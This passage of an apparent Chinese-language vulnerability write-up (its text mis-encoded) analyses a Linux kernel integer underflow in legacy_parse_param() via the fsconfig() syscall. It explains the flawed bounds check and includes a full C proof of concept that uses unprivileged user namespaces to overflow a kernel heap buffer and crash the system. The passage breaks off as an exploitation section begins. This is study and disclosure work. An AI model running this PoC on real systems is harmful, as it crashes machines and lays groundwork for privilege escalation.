class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€å¥—æµç¨‹ä¸‹æ¥ä¾¿æ˜¯ new Filesystem mount API çš„åŸºæœ¬ç”¨æ³•</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><h2 id="legacy-parse-param-æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´"><a href="#legacy-parse-param-æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´" class="headerlink" title="legacy_parse_param() - æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´"></a>legacy_parse_param() - æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´</h2><p>å‰é¢æˆ‘ä»¬æåˆ°è¯¥æ¼æ´å‘ç”Ÿäº <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œè‹¥æˆ‘ä»¬ç»™çš„ <code>cmd</code> ä¸º <code>FSCONFIG_SET_STRING</code>ï¼Œåˆ™åœ¨å†…æ ¸ä¸­å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>vfs_parse_fs_param()</code> ä¸­ä¼šè°ƒç”¨ <code>fs_context-&gt;ops-&gt;parse_param</code> å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ä¸­ <code>fs_context</code> çš„å‡½æ•°è¡¨ä¼šè¢«è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼Œå…¶ <code>parse_param</code> æŒ‡é’ˆå¯¹åº”ä¸º <code>legacy_parse_param()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨è¯¥å‡½æ•°ä¸­ï¼Œåœ¨è®¡ç®— <code>len &gt; PAGE_SIZE - 2 - size</code> æ—¶ï¼Œç”±äº size ä¸º <code>unsigned int</code> ï¼Œè‹¥ <code>size + 2 &gt; PAGE_SIZE</code> ï¼Œåˆ™ <code>PAGE_SIZE - 2 - size</code> çš„ç»“æœ<strong>ä¼šä¸‹æº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·å€¼ï¼Œä»è€Œç»•è¿‡ len çš„æ£€æŸ¥</strong>ï¼Œè¿™é‡Œçš„ size æ¥æºä¸º <code>ctx-&gt;data_size</code>ï¼Œå³<strong>å·²æ‹·è´çš„æ€»çš„æ•°æ®é•¿åº¦</strong>ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// å·²æ‹·è´çš„æ•°æ®é•¿åº¦</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// è®¡ç®— len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// å¯¹åº” FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// æ­¤å¤„å­˜åœ¨æ•´å‹æº¢å‡ºçš„æ¼æ´ï¼Œè‹¥ size + 2 å¤§äºä¸€å¼ é¡µçš„å¤§å°åˆ™ä¼šä¸Šæº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·æ•´å‹ï¼Œ</span><br><span class="hljs-comment">// å¯¼è‡´æ­¤å¤„é€šè¿‡æ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´åç»­æ­¥éª¤ä¸­çš„è¶Šç•Œæ‹·è´</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>åœ¨åé¢çš„æµç¨‹ä¸­ä¼šä»ç”¨æˆ·æ§ä»¶å°†æ•°æ®æ‹·è´åˆ°  <code>ctx-&gt;legacy_data</code>  ä¸Šï¼Œè€Œ <code>ctx-&gt;legacy_data</code> ä»…åˆ†é…äº†ä¸€å¼ é¡µé¢å¤§å°ï¼Œä½†åç»­æµç¨‹ä¸­çš„æ‹·è´æ˜¯ä» <code>ctx-&gt;legacy_data[size]</code> å¼€å§‹çš„ï¼Œ<strong>ç”±äº size å¯ä»¥å¤§äºä¸€å¼ é¡µå¤§å°ï¼Œå› æ­¤æ­¤å¤„å¯ä»¥å‘ç”Ÿæ•°æ®æ•°æ®å†™å…¥</strong>ï¼Œç”±äº <code>ctx-&gt;legacy_data</code> åœ¨åˆ†é…æ—¶ä½¿ç”¨çš„æ˜¯é€šç”¨çš„åˆ†é… flag <code>GFP_KERNEL</code>ï¼Œå› æ­¤å¯ä»¥æº¢å‡ºåˆ°ç»å¤§å¤šæ•°çš„å¸¸ç”¨ç»“æ„ä½“ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä¸º legacy_data åˆ†é…ä¸€å¼ é¡µçš„å¤§å°</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº fsconfig çš„é™åˆ¶ï¼Œæˆ‘ä»¬å•æ¬¡å†™å…¥çš„æœ€å¤§é•¿åº¦ä¸º 256 å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¤šæ¬¡è°ƒç”¨ fsconfig ä»¥è®©å…¶é€æ¸é€¼è¿‘ <code>PAGE_SIZE</code>ï¼Œè€Œ <code>len &gt; PAGE_SIZE - 2 - size</code> çš„æ£€æŸ¥<strong>å¹¶éå®Œå…¨æ— æ•ˆ</strong>ï¼Œç”±äº size ä¸ºå·²æ‹·è´æ•°æ®é•¿åº¦è€Œ len ä¸ºå¾…æ‹·è´æ•°æ®é•¿åº¦ï¼Œå› æ­¤<strong>åªæœ‰å½“ size ç´¯åŠ åˆ° 4095 æ—¶æ‰ä¼šå‘ç”Ÿæ•´å‹æº¢å‡º</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨è¿›è¡Œæº¢å‡ºå‰éœ€è¦å¡å¥½å·²æ‹·è´æ•°æ®é•¿åº¦<strong>åˆšå¥½ä¸º <code>4095</code></strong></p><p>ç”±äº <code>legacy_parse_param()</code> ä¸­æ‹·è´çš„ç»“æœå½¢å¼ä¸º <code>&quot;,key=val&quot;</code>ï¼Œæ•…æˆ‘ä»¬æœ‰å¦‚ä¸‹è®¡ç®—å…¬å¼ï¼š</p><ul><li><code>å•æ¬¡æ‹·è´æ•°æ®é•¿åº¦ = len(key) + len(val) + 2</code></li></ul><p>ä¸‹é¢ç¬”è€…ç»™å‡ºä¸€ä¸ªç¬”è€…è‡ªå·±è®¡ç®—çš„ 4095ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>ç”±äºå¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹éƒ½æœªè®¾ç½® <code>init_fs_context</code>ï¼Œå› æ­¤æœ€åéƒ½å¯ä»¥èµ°åˆ° <code>legacy_parse_param()</code> çš„æµç¨‹å½“ä¸­ï¼Œä¾‹å¦‚ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿçš„ <code>file_system_type</code> å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†é€šè¿‡ ext4 æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ¼æ´å¤ç°ï¼Œæˆ‘ä»¬åªéœ€è¦è¶Šç•Œå†™è¶³å¤Ÿé•¿çš„ä¸€å—å†…å­˜ï¼Œé€šå¸¸éƒ½èƒ½å†™åˆ°ä¸€äº›å†…æ ¸ç»“æ„ä½“ä»è€Œå¯¼è‡´ kernel panic</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ filesystem mount API éœ€è¦å‘½åç©ºé—´å…·æœ‰  <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œä½†ç”±äºå…¶<strong>ä»…æ£€æŸ¥å‘½åç©ºé—´æƒé™</strong>ï¼Œæ•…å¯¹äºæ²¡æœ‰è¯¥æƒé™çš„ç”¨æˆ·åˆ™å¯ä»¥é€šè¿‡ <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼Œä»¥åœ¨æ–°çš„å‘½åç©ºé—´å†…è·å–å¯¹åº”æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡å †æº¢å‡ºé€ æˆ kernel panicï¼š</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>ä¸‹é¢ç¬”è€…ç»™å‡ºä¸¤ç§åˆ©ç”¨æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬äºŒé‡å°šæœªç»è¿‡éªŒè¯ï¼ˆä¸è¿‡ç†è®ºä¸Šå¯è¡Œï¼‰</p><h2 id="æ–¹æ³•ä¸€ã€è¦†å†™-pipe-buffer-æ„é€ é¡µçº§-UAF"><a href="#æ–¹æ³•ä¸€ã€è¦†å†™-pipe-buffer-æ„é€ é¡µçº§-UAF" class="headerlink" title="æ–¹æ³•ä¸€ã€è¦†å†™ pipe_buffer æ„é€ é¡µçº§ UAF"></a>æ–¹æ³•ä¸€ã€è¦†å†™ <code>pipe_buffer</code> æ„é€ é¡µçº§ UAF</h2><blockquote><p>è™½ç„¶è¿™ç¯‡åšå®¢å†™äº 1 æœˆï¼Œä½†æ˜¯è¿™ä¸ªé€šç”¨åˆ©ç”¨æ–¹æ³•ç¬”è€…æœ€åˆå…¬å¼€äº 4 æœˆä»½çš„ <a 